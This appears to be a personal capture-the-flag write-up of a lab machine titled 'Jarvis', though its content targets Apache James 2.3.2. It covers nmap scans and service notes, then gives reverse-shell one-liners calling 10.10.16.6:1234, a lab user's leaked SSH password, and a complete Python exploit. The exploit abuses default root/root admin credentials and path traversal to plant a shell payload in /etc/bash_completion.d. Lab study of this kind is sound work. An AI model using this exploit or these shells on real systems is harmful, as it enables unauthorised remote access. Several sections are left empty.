# Machine #9 Jarvis  


## Nmap Results  
  <img src="https://nmap.org/images/nmap-logo-256x256.png">   

* Initial nmap output  

  ```console
  PORT    STATE SERVICE
  22/tcp  open  ssh
  25/tcp  open  smtp
  110/tcp open  pop3
  119/tcp open  nntp
  ```  

* Full scan   

  ```console
  PORT     STATE SERVICE
  22/tcp   open  ssh
  25/tcp   open  smtp
  110/tcp  open  pop3
  119/tcp  open  nntp
  4555/tcp open  rsip
  ```

<br/><br/>

## Banner Grabbing of Services  

* The most important banner grab  
  ```console
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

<br/><br/>

## Searchsploiting Results   
  <img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   



<br/><br/>  

## Gobustering Stuff  
  <img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  



<br/><br/>

## Thinking Out Loud   

  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQr4hzX6KoRN5PjPJjy8QC43K0T-CoXZHawDIxG4jCa9aMD1K8Vl3vhpG2a2OVbiy-i93c&usqp=CAU" width=200 height=200>  

  * `nntp` stands for Network News Transfer Protocol.
  * From GeeksForGeeks:
    * It is designed specifically to transfer news/articles.
    * NNTP is a set of rules for clients/newsreaders to interact with servers to retrieve newsgroups.
  * Turns out the port 119 is used by nntp clients and nntp servers use 433.  
  * Apache James is written in java.  
    <blockquote>
    Apache James exposes an administration console allowing privileged users to configure and manage the server and tweak its functions. By default, the server is configured to listen for email transactions on network port 25 and administration transactions on port 4555
    </blockquote>  

  * That's the case in our machine.   

    <blockquote>
    Since Apache James listens for email transactions on port 25, a privileged port, it must run as a privileged user like root, meaning it has access to the operating system's sensitive resources. This level of access increases the potential impact of a security breach since a vulnerability in Apache James can affect the entire operating system.
    </blockquote>  

  * Seems like port 25 is a privileged port.

* Taken from "networksorcery":  
  <blockquote>
  An alternative to a NAT is an architecture that allows the hosts within the first (e.g., private) routing realm to directly use addresses and other routing parameters from the second (e.g., public) routing realm. Thus, RSIP has been defined as a method for address sharing that exhibits more transparency than NAT. In particular, RSIP requires that an RSIP gateway (a router or gateway between the two realms) assign at least one address from the second routing realm, and perhaps some other resources, to each RSIP host. An RSIP host is a host in the first routing realm that needs to establish end-to-end connectivity to a host, entity or device in the second routing realm. Thus, the second routing realm is not directly accessible from the RSIP host, but this system allows packets to maintain their integrity from the RSIP host to their destination. ALGs are not required in the RSIP gateway. RSIP requires that hosts be modified so that they place some number of layer three, layer four or other values from those assigned by the RSIP gateway in each packet bound for the second routing realm.
  </blockquote>   

* Also, check this <a href="http://www.networksorcery.com/enp/protocol/rsip.htm">link</a> for more on RSIP.  

* The SMTP version we have is **JAMES SMTP Server 2.3.2** which has a very, seemingly, popular exploit that does not work unless we have the default installation of james smtp server 2.3.2  

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f  

* Found these in the root command in the smtp service  
```console
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d //I created this one -SB
user: thomas
user: john
user: mindy
user: mailadmin
```  

* The pop3 is also "JAMES POP3 Server 2.3.2".  

* Mindy's creds  
```
Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@
```  

nc -c bash 10.10.16.6 1234  


* James's home  

```console
/home/james/.bash_logout                                                          
/home/james/.ICEauthority
/home/james/.local/share/tracker/data/tracker-store.journal
/home/james/.local/share/tracker/data/tracker-store.ontology.journal
/home/james/.local/share/gnome-settings-daemon/input-sources-converted
/home/james/.local/share/xorg/Xorg.0.log
/home/james/.local/share/xorg/Xorg.0.log.old
/home/james/.local/share/folks/relationships.ini
/home/james/.profile
/home/james/.bashrc

/home/james/.bash_history
```

* Check this out  
```console
-rw-r--r--   1 root root   663 Apr 12  2016 bash_completion.sh
```   

* Private SSH keys  
```console
/etc/ImageMagick-6/mime.xml
```
<br/><br/>



## How Did I Solve the Machine 

   <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   

     

## Where I Got Stuck?   
   

## What Did I learn from this Machine?  
* The ability to telnet should be disabled. 


 


```python
import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user 
payload = 'nc -c bash 10.10.16.6 1234' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."
```